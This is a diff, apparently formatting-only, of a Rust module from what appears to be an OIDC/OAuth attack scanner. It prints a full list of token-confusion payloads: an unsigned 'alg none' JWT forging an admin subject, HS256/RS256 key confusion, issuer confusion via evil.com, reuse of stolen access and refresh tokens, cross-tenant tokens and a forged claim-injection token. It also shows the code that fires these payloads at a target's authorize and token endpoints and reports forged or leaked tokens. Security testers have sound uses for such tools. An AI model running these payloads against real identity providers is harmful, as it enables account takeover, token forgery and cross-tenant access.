@@ -29,21 +29,73 @@ const OIDC_ENDPOINTS: &[(&str, &str)] = &[
 ];
 
 const CONFUSION_PAYLOADS: &[(&str, &str, &str)] = &[
-    ("Token mix-up — code as id_token", "id_token=AUTH_CODE&grant_type=authorization_code", "POST"),
-    ("Hybrid flow abuse", "response_type=code%20id_token&nonce=attacker", "GET"),
-    ("Implicit token confusion", "response_type=token&response_mode=fragment", "GET"),
+    (
+        "Token mix-up — code as id_token",
+        "id_token=AUTH_CODE&grant_type=authorization_code",
+        "POST",
+    ),
+    (
+        "Hybrid flow abuse",
+        "response_type=code%20id_token&nonce=attacker",
+        "GET",
+    ),
+    (
+        "Implicit token confusion",
+        "response_type=token&response_mode=fragment",
+        "GET",
+    ),
     ("Access token as ID token", "id_token=ACCESS_TOKEN", "POST"),
-    ("JWT confusion — alg none", r#"{"alg":"none","typ":"JWT"}.{"sub":"admin","iss":"target"}"#, "POST"),
-    ("JWT confusion — HS256 with RS256 key", r#"{"alg":"HS256","typ":"JWT"}.{"sub":"admin"}"#, "POST"),
-    ("Issuer confusion", "iss=https://evil.com&target_iss=https://target.com", "POST"),
-    ("Audience confusion", "aud=evil_client_id&target_aud=target_client_id", "POST"),
+    (
+        "JWT confusion — alg none",
+        r#"{"alg":"none","typ":"JWT"}.{"sub":"admin","iss":"target"}"#,
+        "POST",
+    ),
+    (
+        "JWT confusion — HS256 with RS256 key",
+        r#"{"alg":"HS256","typ":"JWT"}.{"sub":"admin"}"#,
+        "POST",
+    ),
+    (
+        "Issuer confusion",
+        "iss=https://evil.com&target_iss=https://target.com",
+        "POST",
+    ),
+    (
+        "Audience confusion",
+        "aud=evil_client_id&target_aud=target_client_id",
+        "POST",
+    ),
     ("Nonce reuse", "nonce=reused_nonce_value", "GET"),
-    ("c_hash mismatch", "c_hash=invalid_hash&at_hash=invalid_hash", "POST"),
-    ("Token replay — expired", "token=expired_token&grant_type=urn:ietf:params:oauth:grant-type:token-exchange", "POST"),
-    ("Token exchange", "subject_token=STOLEN_TOKEN&subject_token_type=urn:ietf:params:oauth:token-type:access_token&grant_type=urn:ietf:params:oauth:grant-type:token-exchange", "POST"),
-    ("Refresh token as access", "refresh_token=STOLEN_REFRESH&grant_type=refresh_token&scope=openid", "POST"),
-    ("Cross-tenant token", "token=TENANT_A_TOKEN&tenant=TENANT_B", "POST"),
-    ("Claim injection", r#"id_token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AdGFyZ2V0LmNvbSJ9."#, "POST"),
+    (
+        "c_hash mismatch",
+        "c_hash=invalid_hash&at_hash=invalid_hash",
+        "POST",
+    ),
+    (
+        "Token replay — expired",
+        "token=expired_token&grant_type=urn:ietf:params:oauth:grant-type:token-exchange",
+        "POST",
+    ),
+    (
+        "Token exchange",
+        "subject_token=STOLEN_TOKEN&subject_token_type=urn:ietf:params:oauth:token-type:access_token&grant_type=urn:ietf:params:oauth:grant-type:token-exchange",
+        "POST",
+    ),
+    (
+        "Refresh token as access",
+        "refresh_token=STOLEN_REFRESH&grant_type=refresh_token&scope=openid",
+        "POST",
+    ),
+    (
+        "Cross-tenant token",
+        "token=TENANT_A_TOKEN&tenant=TENANT_B",
+        "POST",
+    ),
+    (
+        "Claim injection",
+        r#"id_token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AdGFyZ2V0LmNvbSJ9."#,
+        "POST",
+    ),
 ];
 
 pub async fn confuse(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
@@ -83,7 +135,11 @@ pub async fn confuse(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Re
     }
 
     println!("\n{} [2/2] Token confusion attacks...", "[*]".cyan().bold());
-    println!("  {} Testing {} confusion payloads...", "*".cyan(), CONFUSION_PAYLOADS.len());
+    println!(
+        "  {} Testing {} confusion payloads...",
+        "*".cyan(),
+        CONFUSION_PAYLOADS.len()
+    );
     let mut results = Vec::new();
 
     for (name, body, method) in CONFUSION_PAYLOADS {
@@ -92,7 +148,8 @@ pub async fn confuse(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Re
             let auth_url = format!("{}{}?{}", base, "/oauth2/authorize", body);
             client.get(&auth_url)
         } else {
-            client.post(&token_url)
+            client
+                .post(&token_url)
                 .header("Content-Type", "application/x-www-form-urlencoded")
                 .body(body.to_string())
         };
@@ -101,9 +158,12 @@ pub async fn confuse(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Re
             Ok(resp) => {
                 let status = resp.status().as_u16();
                 let resp_body = resp.text().await.unwrap_or_default();
-                let has_token = resp_body.contains("access_token") || resp_body.contains("id_token");
+                let has_token =
+                    resp_body.contains("access_token") || resp_body.contains("id_token");
                 let has_error = resp_body.contains("error") || resp_body.contains("invalid");
-                let has_user = resp_body.contains("sub") || resp_body.contains("email") || resp_body.contains("admin");
+                let has_user = resp_body.contains("sub")
+                    || resp_body.contains("email")
+                    || resp_body.contains("admin");
 
                 let tag = if has_token && !has_error {
                     "TOKEN ISSUED".red().bold().to_string()
@@ -125,12 +185,21 @@ pub async fn confuse(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Re
                 );
 
                 if (has_token || has_user) && !has_error {
-                    println!("    {} {}", ">".red().bold(), resp_body.chars().take(200).collect::<String>());
+                    println!(
+                        "    {} {}",
+                        ">".red().bold(),
+                        resp_body.chars().take(200).collect::<String>()
+                    );
                     results.push(*name);
                 }
             }
             Err(_) => {
-                println!("  {} [{:02}] {:40} error", "*".red(), results.len() + 1, name);
+                println!(
+                    "  {} [{:02}] {:40} error",
+                    "*".red(),
+                    results.len() + 1,
+                    name
+                );
             }
         }
     }
@@ -144,20 +213,38 @@ pub async fn confuse(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Re
     );
 
     if !results.is_empty() {
-        let has_jwt = results.iter().any(|n| n.contains("JWT") || n.contains("alg"));
-        let has_replay = results.iter().any(|n| n.contains("replay") || n.contains("exchange") || n.contains("Cross"));
-        let has_mixup = results.iter().any(|n| n.contains("mix") || n.contains("Hybrid") || n.contains("Implicit"));
+        let has_jwt = results
+            .iter()
+            .any(|n| n.contains("JWT") || n.contains("alg"));
+        let has_replay = results
+            .iter()
+            .any(|n| n.contains("replay") || n.contains("exchange") || n.contains("Cross"));
+        let has_mixup = results
+            .iter()
+            .any(|n| n.contains("mix") || n.contains("Hybrid") || n.contains("Implicit"));
         if has_jwt {
-            println!("{} [CRITICAL] JWT algorithm confusion — token forgery possible!", "[!]".red().bold());
+            println!(
+                "{} [CRITICAL] JWT algorithm confusion — token forgery possible!",
+                "[!]".red().bold()
+            );
         }
         if has_replay {
-            println!("{} [CRITICAL] Token replay/exchange — cross-tenant access!", "[!]".red().bold());
+            println!(
+                "{} [CRITICAL] Token replay/exchange — cross-tenant access!",
+                "[!]".red().bold()
+            );
         }
         if has_mixup {
-            println!("{} [HIGH] Token mix-up — authorization code can be stolen!", "[!]".red().bold());
+            println!(
+                "{} [HIGH] Token mix-up — authorization code can be stolen!",
+                "[!]".red().bold()
+            );
         }
     } else {
-        println!("{} No OIDC confusion vulnerabilities detected.", "[-]".green().bold());
+        println!(
+            "{} No OIDC confusion vulnerabilities detected.",
+            "[-]".green().bold()
+        );
     }
 
     Ok(())
